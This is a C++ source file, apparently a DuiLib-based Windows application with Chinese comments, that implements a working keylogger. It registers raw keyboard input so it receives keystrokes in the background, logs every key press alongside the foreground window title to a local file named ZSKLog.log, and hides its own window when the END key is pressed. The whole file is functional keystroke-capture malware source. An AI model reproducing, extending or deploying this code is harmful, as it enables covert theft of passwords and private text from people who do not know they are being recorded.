#include "StdAfx.h"
#include "MainWnd.h"
#include "vkey.h"
CMainWnd::CMainWnd(void)
{

} 


CMainWnd::~CMainWnd(void)
{
}

LRESULT CMainWnd::HandleMessage( UINT uMsg, WPARAM wParam, LPARAM lParam )
{
	LPBYTE lpb = NULL;
	RAWINPUT * raw = NULL;
	DWORD dwWritten = 0;
	UINT dwSize;
	try
	{
		if (uMsg == WM_NCLBUTTONDBLCLK)
			return 1;
		else if (uMsg == WM_INPUT)//windows通知应用程序,有设备出现消息
		{
			if (GetRawInputData == NULL)//判断前面获取GetRawInputData API地址是否已经成功了
				return true;
			//第一次调用 ,目的是获取消息的内存字节数
			GetRawInputData((HRAWINPUT)lParam, RID_INPUT, NULL, &dwSize, sizeof(RAWINPUTHEADER));
			//动态申请一片内存
			lpb = new byte[dwSize];
			if (lpb == NULL)
			{
				MessageBoxA(this->GetHWND(), "申请内存失败", "Error", MB_OK);
				return true;
			}
			//内存申请完成以后,开始第二次调用,目的是正式的获取消息记录
			if (GetRawInputData((HRAWINPUT)lParam, RID_INPUT, lpb, &dwSize, sizeof(RAWINPUTHEADER)) != dwSize)
			{
				MessageBoxA(this->GetHWND(), "获取原始输入设备信息失败", "Error", MB_OK);
				return true;
			}
			raw = (RAWINPUT*)lpb;
			char szKeyLog[256] = { '\0' };
			if (raw->header.dwType == RIM_TYPEKEYBOARD)
			{
				//获取到了当前键盘设备信息

				//获取当前窗口的标题
				HWND hwnd = GetForegroundWindow();
				char szWndTitle[256];
				GetWindowTextA(hwnd, szWndTitle, 256);

				//保存需要的信息
				sprintf_s(szKeyLog, sizeof(szKeyLog), "[%s -0x%X]:%s\r\n", szWndTitle, hwnd, GetKeyName(raw->data.keyboard.VKey));
				if (hFile != INVALID_HANDLE_VALUE)
				{
					SetFilePointer(hFile, 0, 0, FILE_END);
					WriteFile(hFile, szKeyLog, strlen(szKeyLog), &dwWritten, NULL);
				}
				//char 转 unicode
				int unicodeLen = ::MultiByteToWideChar(CP_ACP, 0, szKeyLog, -1, 0, 0);
				WCHAR * wszKeyLog = new WCHAR[unicodeLen];
				memset(wszKeyLog, 0, sizeof(WCHAR)*unicodeLen);
				::MultiByteToWideChar(CP_ACP, 0, szKeyLog, -1, wszKeyLog, unicodeLen);
				//显示到界面上去
				pMsgLabel->SetText(wszKeyLog);
				
				//如果按HOME显示本监听器,如果按END键,隐藏监听器
				if (VK_HOME == raw->data.keyboard.VKey)
					this->ShowWindow(true);
				else if (VK_END == raw->data.keyboard.VKey)
					this->ShowWindow(false);
			}
			else if (raw->header.dwType == RIM_TYPEMOUSE)
			{
			}
			delete [] lpb;

		}
		return WindowImplBase::HandleMessage(uMsg,wParam,lParam);
	}
	catch (...)
	{
		throw "CMainWnd::HandleMessage";
	}
}

void CMainWnd::InitWindow()
{
	try
	{
		WindowImplBase::InitWindow();
		pCloseBtn = static_cast<CButtonUI*>(m_PaintManager.FindControl(_T("SysCloseBtn")));
		pCloseBtn->OnNotify += MakeDelegate(this, &CMainWnd::OnCloseBtnClick, _T("click"));
		pMsgLabel = static_cast<CLabelUI*>(m_PaintManager.FindControl(_T("msg")));

		HMODULE htmp = LoadLibraryA("User32.dll");
		if (htmp)
		{
			RegisterRawInputDevices = (PRegisterRawInputDevices)GetProcAddress(htmp, "RegisterRawInputDevices");
			if (!RegisterRawInputDevices)
			{
				MessageBoxA(NULL, "获取RegisterRawInputDevices函数地址失败", "Error", MB_OK);
				return;
			}
		}
		if (htmp)
		{
			GetRawInputData = (PGetRawInputData)GetProcAddress(htmp, "GetRawInputData");
			if (!GetRawInputData)
			{
				MessageBoxA(NULL, "获取GetRawInputData函数地址失败", "Error", MB_OK);
				return;
			}
		}

		RAWINPUTDEVICE rid;
		rid.dwFlags = RIDEV_INPUTSINK;
		rid.usUsagePage = 0x01;
		rid.usUsage = 0x06;
		rid.hwndTarget = this->GetHWND();
		//注册原始输入设备
		RegisterRawInputDevices(&rid, 1, sizeof(RAWINPUTDEVICE));

		hFile = CreateFileA(".\\ZSKLog.log", GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, NULL, NULL);
		if (hFile == INVALID_HANDLE_VALUE)
		{
			MessageBoxA(this->GetHWND(), "创建记录文件失败", "Error", MB_OK);
			return;
		}



		pMsgLabel->SetText(_T("系统初始化完成，择善NB!"));
	}
	catch (...)
	{
		throw "CMainWnd::Init";
	}
}

//************************************
// 函数名称: Notify
// 返回类型: void
// 参数信息: TNotifyUI & msg
// 函数说明: 
//************************************
void CMainWnd::Notify( TNotifyUI& msg )
{
	WindowImplBase::Notify(msg);
}
//************************************
// 函数名称: OnCloseBtnClick
// 返回类型: bool
// 参数信息: TNotifyUI* pTNotifyUI
// 函数说明: 关闭按钮对应的响应函数
//************************************
bool CMainWnd::OnCloseBtnClick(TNotifyUI* pTNotifyUI, LPARAM lParam, WPARAM wParam)
{
	PostQuitMessage(0);
	return true;
}
